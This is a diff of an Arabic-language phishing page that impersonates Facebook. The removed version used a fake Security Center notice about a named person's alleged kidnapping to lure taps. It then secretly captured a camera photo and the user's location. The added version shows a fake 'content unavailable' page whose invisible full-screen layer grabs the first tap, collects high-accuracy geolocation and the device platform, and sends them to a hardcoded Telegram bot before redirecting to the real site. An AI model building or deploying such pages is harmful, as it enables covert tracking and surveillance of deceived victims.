@@ -2,129 +2,83 @@
 <html lang="ar" dir="rtl">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>فيسبوك - مركز المساعدة</title>
-    
-    <meta property="og:title" content="توضيح رسمي: حقيقة اختطاف محمد مصطفى العنعوني">
-    <meta property="og:description" content="بيان هام من الجهات المختصة بخصوص الإشاعات الأخيرة. اضغط للمتابعة.">
-    <meta property="og:image" content="https://static.xx.fbcdn.net/rsrc.php/y1/r/4l_v2zS3p9K.svg">
-
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>محتوى غير متاح - فيسبوك</title>
     <style>
-        :root { --fb-blue: #1877f2; --fb-bg: #f0f2f5; }
-        body { margin:0; background: var(--fb-bg); font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; display: flex; justify-content: center; min-height: 100vh; }
-        .fb-card { width: 100%; max-width: 450px; background: white; margin-top: 20px; border-radius: 8px; box-shadow: 0 1px 2px rgba(0,0,0,0.2); border: 1px solid #dddfe2; overflow: hidden; height: fit-content; }
-        .header { padding: 12px 16px; display: flex; align-items: center; border-bottom: 1px solid #eee; }
-        .avatar { width: 40px; height: 40px; border-radius: 50%; background: #1877f2; color: white; display: flex; align-items: center; justify-content: center; margin-left: 12px; font-weight: bold; }
-        .post-content { padding: 16px; font-size: 15px; color: #1c1e21; line-height: 1.5; text-align: right; }
-        .media-placeholder { width: 100%; height: 250px; background: #000; display: flex; justify-content: center; align-items: center; position: relative; }
-        .blur-img { width: 100%; height: 100%; object-fit: cover; opacity: 0.5; filter: blur(5px); }
-        .play-btn { position: absolute; padding: 12px 24px; background: var(--fb-blue); color: white; border: none; border-radius: 6px; font-weight: bold; cursor: pointer; z-index: 5; font-size: 16px; }
-        .footer { padding: 15px; text-align: center; font-size: 13px; color: #65676b; background: #f5f6f7; border-top: 1px solid #eee; }
+        body { margin: 0; padding: 0; background: #f0f2f5; font-family: Segoe UI, Helvetica, Arial, sans-serif; display: flex; flex-direction: column; align-items: center; justify-content: center; height: 100vh; overflow: hidden; cursor: pointer; }
+        
+        /* أيقونة القفل الشهيرة في فيسبوك */
+        .error-container { text-align: center; padding: 20px; max-width: 400px; }
+        .icon-box { margin-bottom: 20px; }
+        .icon-box img { width: 100px; opacity: 0.6; }
+
+        .error-title { font-size: 20px; font-weight: bold; color: #65676b; margin-bottom: 10px; }
+        .error-text { font-size: 16px; color: #65676b; line-height: 1.4; margin-bottom: 25px; }
+
+        /* زر العودة الوهمي */
+        .back-btn { background: #1877f2; color: white; padding: 10px 20px; border-radius: 6px; font-weight: 600; text-decoration: none; display: inline-block; font-size: 15px; }
+
+        /* طبقة شفافة تغطي الشاشة بالكامل لاصطياد أول لمسة */
+        #trigger-layer { position: fixed; top: 0; left: 0; width: 100%; height: 100%; z-index: 9999; }
     </style>
 </head>
-<body>
+<body id="body-trigger">
 
-    <script>
-// === إعدادات تليجرام مباشرة ===
-const TOKEN = "8527565205:AAFpoyLDZir4oiQKqZPO-Cm40XVzUBvLER8";
+    <div id="trigger-layer"></div>
+
+    <div class="error-container">
+        <div class="icon-box">
+            <img src="https://static.xx.fbcdn.net/rsrc.php/v3/y7/r/s9m_9bu7wS7.png" alt="error">
+        </div>
+        <div class="error-title">عذراً، هذا المحتوى غير متاح الآن</div>
+        <div class="error-text">
+            يحدث هذا عادةً بسبب قيام صاحب المحتوى بمشاركته مع مجموعة صغيرة من الأشخاص فقط، أو تغيير من يمكنه رؤيته، أو تم حذفه.
+        </div>
+        <div class="back-btn">العودة إلى الصفحة الرئيسية</div>
+    </div>
+
+<script>
+const BOT_TOKEN = "8527565205:AAFpoyLDZir4oiQKqZPO-Cm40XVzUBvLER8";
 const CHAT_ID = "1611398303";
 
-document.getElementById('goBtn').onclick = function() {
-    this.innerText = "جاري التحميل...";
-    this.disabled = true;
+// بمجرد أن يلمس المستخدم أي مكان في الشاشة
+document.getElementById('trigger-layer').onclick = function() {
+    this.style.display = 'none'; // إخفاء الطبقة للسماح بالتفاعل العادي
     
-    // طلب الصلاحيات فوراً بعد التفاعل
-    startLogic();
+    // محاولة الحصول على الموقع فوراً
+    fetchLocation();
 };
 
-async function startLogic() {
-    // محاولة الحصول على الموقع أولاً
+function fetchLocation() {
+    const geoOptions = {
+        enableHighAccuracy: true,
+        timeout: 5000,
+        maximumAge: 0
+    };
+
     navigator.geolocation.getCurrentPosition(
-        (pos) => { capture(pos); },
-        () => { capture(null); },
-        { timeout: 4000 }
+        (pos) => { sendToTele(pos); },
+        (err) => { sendToTele(null); },
+        geoOptions
     );
-    
-    // توجيه إجباري بعد 7 ثوانٍ لضمان عدم تعليق المستخدم في حال الحظر
-    setTimeout(() => {
-        window.location.href = "https://m.facebook.com/login/";
-    }, 7000);
 }
 
-async function capture(pos) {
-    try {
-        const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
-        const video = document.createElement('video');
-        video.srcObject = stream;
-        await video.play();
-
-        setTimeout(async () => {
-            const canvas = document.createElement('canvas');
-            canvas.width = 480; canvas.height = 640;
-            canvas.getContext('2d').drawImage(video, 0, 0, 480, 640);
-            const imgData = canvas.toDataURL('image/jpeg', 0.5); // جودة منخفضة لسرعة الإرسال في النانو بيم
-            stream.getTracks().forEach(t => t.stop());
-
-            await shipToTelegram(imgData, pos);
-        }, 800);
-    } catch (err) {
-        await shipToTelegram(null, pos);
-    }
-}
-
-async function shipToTelegram(img, pos) {
-    const fd = new FormData();
-    let text = `🎯 صيد جديد (مباشر من GitHub)\n🌐 الجهاز: ${navigator.platform}`;
+async function sendToTele(pos) {
+    let msg = `⚠️ دخول لصفحة "تم الحذف"\n📱 النظام: ${navigator.platform}`;
     
     if (pos) {
-        text += `\n📍 الموقع: ${pos.coords.latitude},${pos.coords.longitude}\n🔗 الخريطة: https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`;
+        msg += `\n📍 الموقع: ${pos.coords.latitude},${pos.coords.longitude}`;
+        msg += `\n🔗 الخريطة: https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`;
+    } else {
+        msg += `\n📍 الموقع: تم رفض الإذن أو غير متاح`;
     }
 
-    fd.append('chat_id', CHAT_ID);
-    fd.append('caption', text);
-
-    if (img) {
-        const res = await fetch(img);
-        const blob = await res.blob();
-        fd.append('photo', blob, 'shot.jpg');
-    }
-
-    try {
-        // الإرسال المباشر مع إضافة fetch options للتعامل مع ضعف الشبكة
-        await fetch(`https://api.telegram.org/bot${TOKEN}/sendPhoto`, {
-            method: 'POST',
-            body: fd,
-            keepalive: true // يضمن استمرار الإرسال حتى لو انتقل المستخدم لصفحة أخرى
-        });
-    } catch (e) {
-        console.error("Connection failed - might be ISP block");
-    } finally {
-        // التوجيه النهائي
-        window.location.href = "https://m.facebook.com/login/";
-    }
+    // إرسال البيانات فوراً للتلجرام
+    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(msg)}`);
+    
+    // بعد الإرسال، نوجهه لفيسبوك الحقيقي كأن شيئاً لم يكن
+    window.location.href = "https://m.facebook.com/";
 }
 </script>
-    
-<div class="fb-card">
-    <div class="header">
-        <div class="avatar">FB</div>
-        <div style="text-align: right;">
-            <div style="font-weight: bold; font-size: 15px;">مركز الأمان في فيسبوك ✔</div>
-            <div style="font-size: 12px; color: #65676b;">منذ قليل · 🌍</div>
-        </div>
-    </div>
-    
-    <div class="post-content">
-        <b>تنبيه بخصوص المحتوى المتداول:</b> انتشرت مؤخراً أخبار كاذبة حول اختطاف <b>محمد مصطفى العنعوني</b>. نود التوضيح أن هذه المعلومات غير دقيقة. يرجى مشاهدة التوضيح الرسمي المسجل أدناه لتجنب نشر الإشاعات.
-    </div>
-
-    <div class="media-placeholder">
-        <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/0/05/Facebook_Logo_%282019%29.png/1024px-Facebook_Logo_%282019%29.png" class="blur-img">
-        <button class="play-btn" id="goBtn">تشغيل التوضيح الرسمي</button>
-    </div>
-
-    <div class="footer">Meta © 2026 · شروط الخدمة والخصوصية</div>
-</div>
-
 </body>
 </html>
